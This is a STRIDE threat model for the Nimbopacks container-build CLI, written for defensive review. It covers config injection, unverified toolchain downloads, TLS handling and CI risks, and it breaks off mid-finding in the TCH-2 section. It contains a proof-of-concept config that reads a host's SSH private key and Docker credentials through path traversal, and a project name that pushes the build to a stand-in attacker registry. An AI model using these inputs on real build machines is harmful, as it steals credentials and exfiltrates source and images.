# Nimbopacks threat model (STRIDE)

| | |
|---|---|
| **Revision** | 2 — incorporates the architecture review of 2026-10-23 |
| **Date** | 2026-10-23 |
| **Author** | Security Engineer |
| **Reviewers** | Principal Architect (architecture invariants, approved rev 2 with required edits), CTO (risk acceptance, pending) |
| **Code reviewed** | `main` @ `3f962f6` |
| **Status** | Architecture-reviewed, out for PR |

This is a retrospective threat model: the code exists, so the surfaces below were read
rather than designed. Every finding was derived by reading the named file at the named
line on `3f962f6`. Where a claim could not be demonstrated in this environment, it says
so and says why it is still believed to be real.

**Revision 2 changelog.** All 7 required edits and all 4 recommended edits from
the Principal Architect's review are folded in: CFG-2 ships with generate-time name
normalisation; CFG-3's regex is replaced and its claim is split into confirmed/unverified
halves; TCH-1's lock is `go:embed`-ed and never project-resolved; TLS-1 is sequenced
against CFG-4; TLS-2's mitigation is re-addressed to `pkg/backend/wolfi/` instead of
`internal/utils/`; TLS-3 targets the per-build work dir; §2 gains TB-6 and a Surface 6
(`nimbopacks update`/grype); the named trust principle is stated once in §2.1 and cited
from every place that independently derived it; `KnownFields(true)` is its own CFG-4
mitigation; §1.3 gains an out-of-tree-templates entry; and §11's ordering reflects CFG-4's
promotion to P0, a new P0 item for the `tlsutil` split, and an explicit land-in-this-order
sequence rather than one shared date. The full review is on
the architecture review; its binding schema ruling (v1 is unfrozen pending
`docs/spec/nimpack-v1.md`) is recorded in §4.1.

---

## 1. Scope

### 1.1 In scope

| # | Surface | Primary code |
|---|---|---|
| 1 | Untrusted `nimpack.yaml` — melange pipeline injection, `${{ }}` expansion | `internal/config/`, `internal/types/`, `internal/pack/`, `pkg/packs/*` |
| 2 | Toolchain download integrity | `internal/toolchain/toolchain.go` |
| 3 | TLS and custom CA handling | `internal/utils/tlsutil.go` |
| 4 | Container runner privileges (the melange runner) | `pkg/backend/wolfi/wolfi.go`, `.github/workflows/samples.yml` |
| 5 | GitHub Actions supply chain | `.github/workflows/*`, `.github/dependabot.yaml` |
| 6 | `nimbopacks update` / the grype invocation path (added in rev 2) | `internal/update/update.go`, `internal/update/grype.go` |

### 1.2 Explicitly deferred

- **`internal/remote/`** — remote git sources, URL parsing, `git` argument injection,
 `//subdir` path traversal. **This package does not exist in this checkout and there is
 no `feature-remote-repos` branch.** Modelling it now would be fiction. It must be
 modelled before the first line of that package merges; the charter already names it as
 a sign-off surface.
- **Registry push authentication.** `AssembleImage` shells out to `docker push`
 (`wolfi.go:229`) and inherits ambient Docker credentials. Deferred until a first-class
 push path exists.
- **The Paperclip agent control plane.** Out of this repository's trust boundary.

### 1.3 Not modelled because the surface does not exist

Nimbopacks is a local CLI. There is no network listener, no user accounts, no session
management, no database, and no PII. The web-application lens set (authn/authz, session
fixation, CSRF, SQL injection, SSRF-from-user-request) is therefore not applied. **If a
future change adds a network service, a registry proxy, or an auth surface, this section
is void and the broader lens set must be applied before that change merges.**

- **Out-of-tree or remote template loading.** Today, every template is `go:embed`-ed from
 `pkg/templates/templates/` ( pass 3, item D). That means templates ship inside the
 binary and are reviewed as source — a genuine positive control, not an absence of one.
 The risk arrives only if a future change adds a template source outside the binary (a
 remote registry, a `--template-dir` flag, a URL). That change must trip this review
 before it merges, the same discipline already applied to `internal/remote/` above.

---

## 2. Trust boundaries

```
 ┌─ TB-1 ──────────────────────────────────────────────────────────────────┐
 │ UNTRUSTED INPUT │
 │ nimpack.yaml · project source tree · referenced CA cert files │
 │ community templates · samples/** (all attacker-controllable via PR) │
 └────────────────────────────┬────────────────────────────────────────────┘
 │ parsed by internal/config (no validation)
 ┌────────────────────────────▼────────────────────────────────────────────┐
 │ NIMBOPACKS PROCESS runs as the invoking user, full user privs │
 │ pipeline → pack.Plan → BuildPlan → backend.wolfi │
 └──────┬──────────────────────┬────────────────────────┬──────────────────┘
 │ TB-2 │ TB-3 │ TB-4
 │ fetch + exec │ exec melange/apko │ write image layers
 ▼ ▼ ▼
 ┌──────────────┐ ┌──────────────────────┐ ┌────────────────────────┐
 │ api.github │ │ BUILD SANDBOX │ │ PUBLISHED OCI IMAGE │
 │.com + │ │ bubblewrap (userns) │ │ + SBOM + cosign sig │
 │ release CDN │ │ OR docker (root!) │ │ + Rekor entry │
 │ (TB-2) │ │ runs build.command │ │ (TB-4) │
 └──────────────┘ └──────────────────────┘ └────────────────────────┘

 ┌─ TB-5 ──────────────────────────────────────────────────────────────────┐
 │ GITHUB ACTIONS: fork PR (read-only token) │ tag push (packages:write, │
 │ │ id-token:write → signs) │
 └─────────────────────────────────────────────────────────────────────────┘

 ┌─ TB-6 ──────────────────────────────────────────────────────────────────┐
 │ SHARED BUILD CACHE (~/.nimbopacks, internal/cache.CacheDir) │
 │ global per machine, NOT per project — persists across every build of │
 │ every project the invoking user runs; not drawn before this revision │
 └─────────────────────────────────────────────────────────────────────────┘
```

**TB-1 is the boundary that matters most, and today it is not mediated at all.**
`internal/config.Validate` exists (`config.go:18`) and is **never called** — `grep -rn
"config.Validate"` returns only its definition and its unit test. `internal/pipeline`
calls `config.Load` (`pipeline.go:29`) and goes straight to `pack.Plan`. Complete
Mediation is violated by construction: there is no checkpoint between untrusted YAML and
the build plan.

**TB-4 is drawn as output-only; it is actually bidirectional.** `AssembleImage`
(`wolfi.go:229`) shells out to `docker push` and inherits ambient Docker credentials from
the invoking environment — an inbound trust dependency into the NIMBOPACKS PROCESS box
that the diagram above does not show. CFG-2 is the finding that exploits this crossing
(an attacker-controlled `project.name` plus the victim's ambient credentials), but it is
filed under Surface 1 even though the boundary it crosses is TB-4. Noted here rather than
redrawn — per, cheaper and sufficient for this revision.

**TB-6 is new in this revision.** `cache.CacheDir` (`internal/cache/cache.go:24`)
resolves to `~/.nimbopacks/cache`; `NewBuildWorkDir` (`:40`) allocates a fresh timestamped
directory per build beneath `BuildsDir`, but that root is shared across every project the
invoking user ever builds. This is TLS-3's pattern — a build artefact surviving on disk
across builds — with a wider radius: the *next* build of a *different* project can observe
whatever a prior build left in the shared root. No finding is filed against TB-6 itself in
this revision; TLS-3's mitigation is updated below to land its fix in the per-build work
dir rather than in `CacheDir`'s root, specifically so it does not create one.

---

### 2.1 Named principle

Four independent findings in this document derive the same rule from first principles —
CFG-1's `--ca-cert` carve-out, TLS-1's move to an environment variable, RUN-1's
CLI-flag-only runner, and the `toolchain.lock` placement decision (§5, TCH-1). Stated once
here per, and cited by name from each:

> **Repository content MUST NOT be able to widen a trust decision.** `nimpack.yaml`
> travels with a fork PR and is written by whoever opened it. A CLI flag or an environment
> variable is an act by the person at the keyboard, made at invocation time. A security
> control may be *narrowed* by repository config and *widened* only by invocation — never
> the other way round.

---

## 3. Scoring

Severity and exploitability are scored **separately**, per the review bar. A critical
finding that needs a nation-state to trigger is not the same risk as a medium finding a
drive-by PR can hit.

**Severity (S)** — impact assuming the attacker succeeds:

| | Meaning |
|---|---|
| **S5 Critical** | Arbitrary code execution on a maintainer/CI host, or tampering that reaches a published, signed release artifact. |
| **S4 High** | Secret disclosure, or arbitrary code execution confined to the build sandbox. |
| **S3 Medium** | Integrity or confidentiality loss confined to one build, or a silently weakened security control. |
| **S2 Low** | Denial of service, or an observable-but-contained misbehaviour. |
| **S1 Info** | Hygiene; no direct attacker benefit. |

**Exploitability (E)** — how hard it is to reach:

| | Meaning |
|---|---|
| **E5 Trivial** | Any contributor opening a PR, or anyone the user already runs code from. No special position. |
| **E4 Easy** | Requires a plausible position: a corporate MITM proxy, a shared CI runner, a published community template. |
| **E3 Moderate** | Requires a specific precondition the attacker cannot set alone (a flag enabled, a particular platform). |
| **E2 Hard** | Requires compromising a well-defended third party (Wolfi, Chainguard, GitHub). |
| **E1 Theoretical** | No practical path known today. |

---

## 4. Surface 1 — Untrusted `nimpack.yaml`

**STRIDE: Tampering, Elevation of privilege, Information disclosure, Denial of service.**
(No Spoofing or Repudiation — the config has no identity and no audit claim.)

### 4.0 The governing design fact

`nimpack.yaml` is **executable**. `build.command` is copied verbatim into a melange
pipeline `runs:` block by every pack — `golangpack.go:116`, `nodepack.go:75`,
`pythonpack.go:110`, `javapack.go:125`, `dotnetpack.go:243`, `webserverpack.go:173`. That
is the feature, not a bug; a build tool has to run the build. The security consequence
must be written down and enforced rather than left implicit:

> **Building a `nimpack.yaml` is equivalent to running it as a shell script.** Never
> build a config you would not `bash` unreviewed.

Everything below is about the parts of the config that are *not* obviously code and that
a reader would therefore assume are inert data.

### 4.1 Schema and compatibility ruling (binding, Principal Architect, )

Several Phase 1 mitigations below change `types.TLSConfig` or add validation that an
existing `nimpack.yaml` could fail. Each is called out as breaking where it is. The
Principal Architect ruled this window open as of 2026-10-23: `schema_version: "1"` is
**not frozen** — there is no released 1.0, no published spec, and `docs/spec/nimpack-v1.md`
does not exist. CFG-1's `inject_into_image` default flip, CFG-2/CFG-3's charsets, CFG-4's
`KnownFields(true)`, and TLS-1's `insecure` removal may all land **without** a
`schema_version` bump, conditional on: **ADR-0002** (Principal Architect, covers all three
`types.TLSConfig` changes as one set), a release-note migration entry per change, and
CFG-1's `nil`-state build-time warning as its migration mechanism. **This window closes the
day `docs/spec/nimpack-v1.md` lands** — after that, each of these becomes a v2 change.

---

### CFG-1 — Arbitrary file read via `tls.ca_cert_paths` exfiltrated into the published image

| | |
|---|---|
| **Class** | Path traversal (CWE-22) in CA-bundle resolution chained to exposure of sensitive information to an unauthorised actor (CWE-200) via an OCI layer |
| **STRIDE** | Information disclosure |
| **Severity** | **S4 High** |
| **Exploitability** | **E4 Easy** |
| **Owner** | Security Engineer |
| **Lenses** | Input handling (allowlist beats denylist), Least Privilege, Secure Defaults |

**Attack path — demonstrated by code reading, end to end:**

1. `tlsutil.resolvePath` (`tlsutil.go:128`) resolves a relative path with
 `filepath.Join(srcDir, path)` and returns an absolute path unchanged. There is no
 `..` rejection and no containment check against `srcDir`.
2. `LoadCACerts` (`tlsutil.go:23`) `os.ReadFile`s every entry and concatenates the raw
 bytes. **It never parses the result as PEM.** Only `NewTLSConfig` calls
 `AppendCertsFromPEM` — and `NewTLSConfig` has zero callers (§6.1).
3. `wolfi.BuildPackage` (`wolfi.go:95`) calls `LoadCACerts` **directly**, so the
 unvalidated bytes skip the only PEM check in the codebase.
4. `TLSConfig.ShouldInjectIntoImage` (`types.go:61`) **defaults to true**.
5. `ImageCACertInstallStep` (`tlsutil.go:113`) emits a pipeline step that copies the
 bundle to `${{targets.destdir}}/etc/ssl/certs/nimbopacks-custom-ca.pem` and
 `/usr/local/share/ca-certificates/nimbopacks-custom-ca.crt`.
6. Those paths are under `${{targets.destdir}}`, so melange packages them. The file is in
 the image, in the SBOM's file inventory, and in any registry it is pushed to.

**Proof-of-concept config:**

```yaml
schema_version: "1"
project: { name: innocuous, version: "1.0.0" }
build: { pack: golang }
tls:
 ca_cert_paths:
 - "../../../../home/runner/.ssh/id_rsa" # traversal out of srcDir
 - "/home/runner/.docker/config.json" # absolute, no containment check
 # inject_into_image omitted — defaults to true
```

Result: the built image contains the host's SSH private key and registry credentials at
`/etc/ssl/certs/nimbopacks-custom-ca.pem`. Nothing in the output says so; the build log
prints only `→ Custom CA certificates configured` (`pipeline.go:87`).

**Blast radius.** Any secret readable by the build user on a machine that builds an
attacker-supplied config, published to wherever the image goes. The realistic victims are
(a) a CI job that builds a fork PR's `nimpack.yaml`, and (b) a user who runs a community
template or sample. The charter's own goal of "templates built for community
contribution" makes (b) a first-class path, not a hypothetical.

**Not demonstrated:** the image could not be built — Docker is unavailable in this
environment, so melange/apko cannot run. The file-read and the pipeline-step emission are
both plain Go that can be read directly; only the final "the bytes are in the layer" step
rests on melange's documented `${{targets.destdir}}` packaging rule, which `CLAUDE.md`
states as an invariant. I rate the chain confirmed-by-reading and will attach a built-image
proof once Docker exists.

**Phase 1 mitigation.**

1. In `resolvePath`, resolve with `filepath.Abs` + `filepath.EvalSymlinks` and reject any
 result not contained in `srcDir`, unless the path came from the `--ca-cert` CLI flag
 (an explicit operator action) rather than from `nimpack.yaml`. Config-supplied paths
 get no escape hatch. This is the named principle from §2.1: a CLI flag may widen a
 trust decision that repository content may only narrow.
2. In `LoadCACerts`, parse every file with `pem.Decode` in a loop and **reject the build**
 unless every block is `CERTIFICATE` and `x509.ParseCertificate` succeeds. A CA bundle
 that is not a CA bundle is a bug in every case; failing closed costs nothing. (This
 lands on the backend-agnostic side of the `tlsutil` split — see TLS-2.)
3. Flip the default: `inject_into_image` defaults to **false**. Approved pre-1.0 under
 §4.1's ruling, with a mandatory migration mechanism — this is breaking by the
 reproducibility test, not the loose one: an existing config with `ca_cert_paths` set and
 `inject_into_image` omitted produces a different image digest after the flip. Keep the
 `*bool` tri-state in `types.go:52` (`InjectIntoImage *bool`) rather than collapsing it to
 a plain `bool` — do not lose the `nil` state. When `HasCustomCAs && InjectIntoImage ==
 nil`, emit a build-time warning naming the default change and the one-line fix
 (`tls: { inject_into_image: true }`); that warning *is* the migration mechanism. Lands
 under ADR-0002 (Principal Architect). **v2 follow-up, recorded now:** once the warning
 has shipped one minor release, `inject_into_image` becomes required whenever
 `ca_cert_paths` or `ca_dir_path` is set — making the illegal state unrepresentable
 instead of merely defaulted.
4. Log every injected certificate's subject and SHA-256 fingerprint at build time, so the
 operator can see what they shipped. (Also lands on the backend-agnostic side of the
 `tlsutil` split.)

**Residual risk after Phase 1:** a user can still deliberately inject a real certificate
they control. That is the feature. Secrets that happen to be valid X.509 certificates
(e.g. a client cert) would still pass the parser — accepted, because the subject/fingerprint
log makes it visible.

---

### CFG-2 — `project.name` is unvalidated and becomes a registry reference

| | |
|---|---|
| **Class** | Unvalidated config value used as an OCI image reference (CWE-20 → CWE-200) |
| **STRIDE** | Information disclosure, Spoofing |
| **Severity** | **S4 High** |
| **Exploitability** | **E3 Moderate** (requires `--push`) |
| **Owner** | Principal Architect (schema), Security Engineer (validation) |
| **Lenses** | Input handling, Complete Mediation |

**Attack path.** `wolfi.AssembleImage` (`wolfi.go:166`) builds the default tag as
`plan.Melange.Package.Name + ":latest"`, and `pack.ApplyConfig` (`pack.go:160`) sets
`Package.Name = cfg.Project.Name` with no validation. When `--push` is set, that string is
passed to `docker push` (`wolfi.go:230`).

```yaml
project:
 name: "attacker.example.com/exfil/app"
```

→ `docker push attacker.example.com/exfil/app:latest`. The image — containing the
victim's source, build artefacts, and anything CFG-1 dragged in — goes to a registry the
attacker controls. `docker push` receives the value as an `argv` element, so there is no
*shell* injection, but the registry host itself is the injected value.

The same unvalidated name is also prepended to the apko package list
(`pack.go:126`) and becomes the APK package name, where a name containing whitespace or an
apk version constraint (`foo~1.0`, `foo>9999`) changes which packages apko resolves.

**Blast radius.** Exfiltration of a complete build to an attacker-chosen registry, plus
image-identity spoofing. Bounded by `--push` being opt-in.

**Phase 1 mitigation.** Validate `project.name` against `^[a-z0-9][a-z0-9._-]{0,62}$` at
load time and reject on mismatch. That is the APK package-name charset; it cannot contain
`/`, `:`, or whitespace, which kills both the registry-reference and the apk-constraint
variants at once. Enforce it in a re-activated `config.Validate` (see CFG-4), not in each
pack.

**Required: this charset must ship with generate-time normalisation, or it breaks
`init` → `build` out of the box.** `cmd/nimbopacks/main.go:160` sets
`projectName = filepath.Base(absDir)`, and `:176`/`:258` override it with the last segment
of the Go module path — neither is normalised, and `pkg/templates/templates_test.go:29`
already asserts on `ProjectName: "OrderSystem"`. A checkout at `~/src/OrderService`, a
module `github.com/acme/OrderService`, and that existing test fixture all fail the charset
on their very first (capitalised) character — a convention a.NET repo hits immediately.
Fix: **normalise at generate time, enforce strictly at load time.** Lowercase, collapse
every run of disallowed runes to a single `-`, strip leading/trailing `-`, truncate to 63.
This must ship in the same change as the charset — landing the charset first is the
regression. Add a round-trip test: `OrderService` → `orderservice` → passes `Validate`.

Three notes carried into the eventual `nimpack.yaml` spec, so the charset's shape is not
"relaxed" later without re-deriving why it is what it is:

- **`{0,62}` (63 total) is not a magic number** — the value must survive as a single DNS
 label and as one OCI repository path component. Record the reason.
- **Excluding `+` is deliberate**, even though apk package names do allow it (`libstdc++`,
 `gcc-12`): `project.name` is *our* package name, never a dependency reference, so the
 narrower charset is safe and must not be "fixed" back to apk's full charset.
- **The charset treats the symptom; the root cause is that `project.name` is one
 stringly-typed field overloaded across three grammars** — melange's `package.name` (apk),
 an apko package-list entry (`pack.go:126`, where `~`, `>`, `=` are version-constraint
 operators), and the default OCI tag (`wolfi.go:166`). The charset is the right Phase 1
 fix because it is the **intersection** of all three grammars; the spec must record it as
 the intersection, not as "the apk charset", or a future widening silently reopens the
 apko-constraint variant. The v2 structural fix — a separate `image.repository` field so
 an OCI reference stops being derived from a package name — is a known gap carried into
 `docs/spec/nimpack-v1.md` by the Principal Architect.

**Residual risk:** none for this class once the charset and its generate-time
normalisation are both enforced; `--push` with an explicit `--tag` remains the operator's
responsibility.

---

### CFG-3 — Second-order `${{ }}` expansion injection via `project.version`

| | |
|---|---|
| **Class** | Template-expansion injection into a melange pipeline, leading to command injection inside the build sandbox |
| **STRIDE** | Elevation of privilege (within the sandbox), Tampering |
| **Severity** | **S3 Medium** (S4 if the runner is docker — see RUN-1) |
| **Exploitability** | **E3 Moderate** |
| **Owner** | Principal Architect (schema), Security Engineer |
| **Lenses** | Input handling (reject ambiguous input), parser differentials |

**Attack path.** `project.version` is unvalidated (`pack.go:161` assigns it straight to
`Package.Version`) and lands in melange's `package.version`. melange expands
`${{package.version}}` inside pipeline `runs:` blocks and `uses:`/`with:` values. The
repository's own `melange.yaml` does exactly this:

```yaml
ldflags: -s -w -X main.version=${{package.version}}
```

A `version` of `0.1.0 -X main.x=y` injects an extra linker flag. A version containing
`` ` `` or `$` reaches a `runs:` shell in any template that embeds the version in a
script. More subtly, a version containing a literal `${{` can introduce a *melange*
expansion that was never in the template — a genuine parser differential between "what
nimbopacks wrote" and "what melange executes".

**This claim has a confirmed first-order half and an unverified second-order half — split
per, so the weaker half cannot be used to dismiss the stronger one:**

- **First-order (confirmed by construction, no melange run needed):** `project.version`
 lands verbatim inside a melange `runs:` script (`pack.go:161` assigns it straight to
 `Package.Version`), so shell metacharacters in it execute in the build sandbox. This
 follows directly from that assignment plus melange's documented substitution behaviour —
 nothing here depends on an environment that can run melange.
- **Second-order (suspected, unverified):** a literal `${{` inside the version re-expands
 as a *melange* directive, producing a parser differential between what nimbopacks wrote
 and what melange executes. This depends on whether melange's template substitution is
 single-pass, which cannot be determined without running melange.

**Honest limitation, scoped to the second-order half only:**

1. No template in `pkg/templates/templates/` currently embeds `${{package.version}}`
 inside a `runs:` block — `grep` confirms zero matches. The hazardous sink exists only
 in the repository's own root `melange.yaml`, which is maintainer-controlled.
2. melange cannot be executed here (no Docker), so the exact expansion/quoting semantics
 could not be exercised.

**I still believe the second-order half is real** because (a) the sink is one community
template away — the charter's explicit goal is "contributors add templates without
writing Go", and a template author embedding `${{package.version}}` in a `runs:` block is
the obvious thing to do; (b) nothing in the codebase prevents it, and nothing warns a
template author; and (c) the root `melange.yaml` already proves the pattern is idiomatic
here. This is a pre-positioned vulnerability waiting for its sink. Severity and
exploitability above are unchanged by the split — the confirmed first-order half alone
already carries S3/E3 (S4/E4 if the runner is docker, see RUN-1); the second-order half
only adds to it, never substitutes for it.

**Phase 1 mitigation.** The originally proposed regex
(`^[0-9]+(\.[0-9]+){0,3}([-+][0-9A-Za-z.-]+)?$`) is **rejected on review** on two grounds:
it allows `+`, which apk versions have no semver build-metadata concept for and which
melange's `package.version` + `epoch` composition either mangles or rejects; and it allows
`-` with further `-` inside, so melange's `-r${{package.epoch}}` suffix turns `1.0-rc1`
into `1.0-rc1-r0`, which apk's comparator reads ambiguously. **Counter-proposal for v1:**
`^[0-9]+(\.[0-9]+){0,3}$` — strictly numeric-dotted, nothing else. It costs nothing today
(every `nimpack.yaml` under `samples/` is `0.0.1`, and `main.go:165` hardcodes
`Version: "0.0.1"` for generated configs, so there is zero migration), it still rejects
`${{`, backticks, `$(`, quotes, newlines, `+`, `-`, and whitespace, and it gets the
compatibility direction right: widening a charset later is non-breaking, narrowing it is
breaking, so v1 should start at the tightest thing that works and add prerelease support
in v1.1 as a free widening. Add a template-author note to `CLAUDE.md`'s "Adding a template"
section. Add a `go test -fuzz` target over `config.Load` + `Validate` that asserts no
accepted value contains `${{`.

**Residual risk:** melange's own expansion of maintainer-written templates is unchanged.
A malicious template is still a malicious template; template review is the control there.

---

### CFG-4 — The config validator is dead code (complete-mediation failure)

| | |
|---|---|
| **Class** | Missing input validation — security check implemented but never invoked (CWE-1288 / CWE-20) |
| **STRIDE** | Tampering, Denial of service |
| **Severity** | **S3 Medium** (it is the enabling condition for CFG-2 and CFG-3) |
| **Exploitability** | **E5 Trivial** |
| **Owner** | Security Engineer |
| **Lenses** | Complete Mediation, Fail Securely |

**Evidence.** `config.Validate` is defined at `internal/config/config.go:18`.
`grep -rn "config.Validate" --include=*.go.` returns the definition and
`config_test.go` only. Neither `internal/pipeline/pipeline.go:29` nor
`internal/update/update.go:44` calls it. Every build in the product runs on a config that
has never been checked for anything, including the three fields `Validate` claims are
required.

**Secondary defects in the loader, all at `config.go:34`:**

- **`schema_version` is never checked.** A file declaring `schema_version: "2"` is parsed
 as v1 and built. When v2 exists, this is a version-confusion parser differential: the
 author's intent and the tool's interpretation diverge silently.
- **No size limit.** `os.ReadFile` on an arbitrary path with no cap, feeding a YAML
 parser. `gopkg.in/yaml.v3` has internal alias-expansion limits, so I am **not** claiming
 a billion-laughs break; I am claiming there is no defence-in-depth bound and no reason
 not to have one.
- **`Load` returns `(nil, nil)` for a missing file.** Both call sites happen to handle it
 (`pipeline.go:33`), but a fail-open sentinel is the wrong default shape for a security-
 relevant loader; a third caller will get it wrong. Note for whoever implements a fix:
 changing the sentinel is a CLI behaviour change (what `nimbopacks build` does in a
 directory with no `nimpack.yaml`), not a pure refactor — scope it as such.

**Mitigation A — wire the validator (the precondition for CFG-2 and CFG-3).** Call
`config.Validate(cfg)` from `pipeline.Build` and `update.Run` immediately after `Load`, and
extend it to enforce CFG-2's name charset, CFG-3's version charset, `schema_version ==
"1"`, and `tls.ca_cert_paths` containment. Ship a regression test per rule. **No
architecture invariant is broken by wiring validation into `internal/pipeline` and
`internal/update`** — per, the charter's "adding a pack/template must not require
touching `internal/types/`/`internal/pipeline/`" rule constrains what a pack contributor
must edit, not a freeze on those packages; validated fields are owned by no pack, and
validation is domain logic, so `internal/config` is the correct home for it.

**Mitigation B — `Decoder.KnownFields(true)`, promoted to its own mitigation because it is
itself a breaking change.** `yaml.Unmarshal` is used without it today, so a typo such as
`tls: { insecur: true }` or `image: { run_as_: 0 }` is silently accepted and ignored — a
user who believes they configured a control has not. Allowlist-beats-denylist applies to
config keys too. But by the same compatibility test used throughout this document (*a
schema change is breaking if an existing valid `nimpack.yaml` stops working*), turning this
on is breaking: any config carrying an unknown key starts failing. That is desirable, but
it needs the same treatment as every other break in this document — approved under §4.1's
ruling, with an ADR and a release-note migration entry, not a casual sub-bullet. **It must
land after TLS-1's hard-fail-on-`insecure:true` step and before `Insecure`'s removal** (see
TLS-1's four-step sequencing) — otherwise a config harmlessly carrying `tls: { insecure:
false }`, copy-pasted from current docs, starts hard-failing with a generic unknown-key
error instead of TLS-1's explicit one.

**Phase 1 mitigation, unchanged from the above:** add a 1 MiB read cap alongside Mitigations
A and B.

**Residual risk:** `build.command` remains arbitrary shell by design (§4.0). Validation
does not change that and must not pretend to.

---

## 5. Surface 2 — Toolchain download integrity

**STRIDE: Tampering, Spoofing, Elevation of privilege, Denial of service.**

This is the highest-value surface in the product. `nimbopacks toolchain install`
downloads three binaries from the internet, writes them mode `0755`, and executes them as
the invoking user on every subsequent build — including on CI runners
(`.github/workflows/samples.yml:80`).

---

### TCH-1 — Downloaded binaries are executed with no integrity verification whatsoever

| | |
|---|---|
| **Class** | Download of code without integrity check (CWE-494) |
| **STRIDE** | Tampering → Elevation of privilege |
| **Severity** | **S5 Critical** |
| **Exploitability** | **E2 Hard** today / **E4 Easy** when chained with TLS-1 |
| **Owner** | Security Engineer |
| **Lenses** | Supply chain (verify every downloaded binary), Defense in Depth, Fail Securely |

**Evidence.** `downloadRelease` (`toolchain.go:358`) fetches an asset, and at
`toolchain.go:447` writes it straight to `~/.nimbopacks/toolchain/bin/<tool>` with mode
`0755`. There is **no** SHA-256 comparison, **no** cosign/Sigstore verification, and
**no** SLSA provenance check anywhere in the file. `grep -i "sha256\|cosign\|sigstore\|
provenance\|verify"` over `internal/toolchain/` returns only the `.sha256` entry in the
skip list.

That skip list is the sharpest part of the finding. At `toolchain.go:391`:

```go
skipSuffixes:= []string{".deb", ".rpm", ".apk", ".msi", ".pkg", ".sha256", ".pem", ".sig", ".sbom"}
```

The code **identifies** the checksum, certificate, and signature assets — and discards
them. Chainguard publishes cosign signatures and certificates for melange and apko;
Anchore publishes `grype_<ver>_checksums.txt` plus a cosign bundle for grype. All the
material needed to verify is already sitting in the same API response the code just
parsed. Economy of Mechanism is not the obstacle here; the verification inputs are free.

**Attack paths, in ascending order of plausibility:**

- *Upstream account compromise.* An attacker who can attach or replace a release asset on
 `chainguard-dev/melange`, `chainguard-dev/apko`, or `anchore/grype` achieves arbitrary
 code execution on every machine that subsequently runs `toolchain install` — and, via
 `samples.yml`, inside CI. E2.
- *Transport interception.* See TLS-1 and TLS-2. Any position that lets an attacker
 terminate TLS to `api.github.com` or `objects.githubusercontent.com` — a corporate MITM
 proxy with its CA in the system store, a compromised egress appliance — yields the same
 RCE, with no signature to stop it. E4.
- *Version-pin absence.* `Install(ctx, "")` resolves `releases/latest`
 (`toolchain.go:331`) with no floor, no lockfile, and no record of what was expected.
 A backdoored upstream release is picked up by the next `toolchain install` or
 `toolchain upgrade` within minutes of publication, with no rollback story. The
 `versions.json` written at `toolchain.go:216` records what was installed but is never
 read back to verify anything.

**Blast radius.** Arbitrary code execution as the developer on every developer machine
that installs the toolchain, and as the runner user in CI with `GITHUB_TOKEN` in the
environment (`samples.yml:79`) and the checkout token in `.git/config` (CI-5). From there
it pivots into any image the victim builds — which is the product's entire value
proposition. **This single finding is the difference between Nimbopacks being a
supply-chain security tool and being a supply-chain attack vector.**

**Not demonstrated:** no exploit was built. Doing so would require either compromising a
Chainguard/Anchore release or standing up a MITM, neither of which is in scope or
authorised. The absence of verification is a direct reading of the file and needs no
proof-of-concept; CWE-494 is established by the code's own skip list.

**Phase 1 mitigation.** One centralised verify-then-install helper — fix the class, not
three instances:

```go
// internal/toolchain/verify.go
func fetchVerified(ctx context.Context, spec ToolSpec) (path string, err error)
```

1. **Pin by default, and the lock's placement is itself a required decision, not an
 implementation detail.** The lock must live at **`internal/toolchain/toolchain.lock`,
 loaded via `go:embed` — never resolved from the project directory or the CWD.** The
 trap: if `toolchain install` resolved a `toolchain.lock` relative to the project being
 built, an attacker-supplied repository could ship its own lock, pin its own digests, and
 defeat this entire mitigation while appearing to be fixed — pinning an attacker can
 rewrite is worse than no pinning, because it reads as a control in review. The lock pins
 *nimbopacks' own* toolchain (identical for every user of a release), not project
 configuration, so it does not belong at the repo root alongside `nimpack.yaml` /
 `.grype.yaml` / `.goreleaser.yaml` — that location invites exactly the wrong resolution
 logic. Embedding is consistent with the existing `pkg/templates/templates/` pattern
 (ship-with-the-binary data, reviewed as source) and keeps it out of `--ca-cert`'s and
 `--runner`'s territory: not overridable by repository content, only by an operator's
 `--toolchain-lock` CLI flag (§2.1's named principle, fourth instance). Keyed on
 `(tool, version, GOOS, GOARCH) → {assetName, sha256}` — a full platform matrix, not one
 entry per tool (see TCH-2) — and loaded via `go:embed` so an unlocked platform fails
 loudly rather than guessing. **Accepted cost:** bumping a pinned tool version now
 requires cutting a nimbopacks release, which is the correct trade — it makes toolchain
 version changes release-gated and CODEOWNERS-reviewable (CI-4) instead of ambient — but
 it is a real maintainer-velocity cost and should not be discovered later. `toolchain
 install` with no `--version` installs the locked version, not `latest`.
2. **Verify the digest unconditionally.** Stream the download through
 `sha256.New` and compare against the lock before anything is written to the install
 directory. Mismatch = hard failure, nothing written. No `--skip-verify` flag; if one is
 ever added it must be a build tag, not a runtime flag.
3. **Download to a `0600` temp file in the same directory, `chmod 0755` and
 `os.Rename` only after verification passes.** Today a failed or truncated download
 leaves an executable at the canonical path.
4. **`fetchVerified` must preserve TCH-3's no-token-to-CDN split, with a regression test.**
 TCH-3 credits `setGitHubAuth` (`toolchain.go:321`) for being applied to the two
 `api.github.com` requests and **not** to the asset download (`toolchain.go:425`), so
 `GITHUB_TOKEN` never reaches the release CDN or a redirect target — a load-bearing
 property. The natural shape of "one helper that does the API call and the download" is
 one client with one auth configuration, which would silently re-merge the two and leak
 the token to the CDN. Add a test asserting no `Authorization` header is present on the
 asset request or on any redirect hop, so the refactor that threatens TCH-3's good
 behaviour cannot regress it unnoticed.
5. **Phase 2 (schedule now, 30 days):** cosign keyless verification against the upstream
 OIDC identity for melange/apko/grype, and SLSA provenance where published. Digest
 pinning is the 90%-good fix available this week; signature verification is the right
 long-term control because it survives a lock-file bump.

**Residual risk after Phase 1:** a digest pin trusts whoever wrote the lock entry. A
malicious upstream release that is pinned *into* the lock by a routine Dependabot-style
bump would still be installed. Signature verification (Phase 2) plus human review of lock
bumps is the answer; until then, lock changes must be a CODEOWNERS-protected path (CI-4).

---

### TCH-2 — Release asset selected by substring match against a denylist

| | |
|---|---|
| **Class** | Ambiguous resource resolution — denylist-based filtering with unanchored substring matching (CWE-625 / CWE-183) |
| **STRIDE** | Tampering, Spoofing |
| **Severity** | **S4 High** (it is the delivery vehicle for TCH-1) |
| **Exploitability** | **E2 Hard** standalone |
| **Owner** | Security Engineer |
| **Lenses** | Input handling (allowlist beats denylist), Economy of Mechanism |

**Evidence.** `toolchain.go:403–416`:

```go
if strings.Contains(strings.ToLower(asset.Name), strings.ToLower(pattern)) {
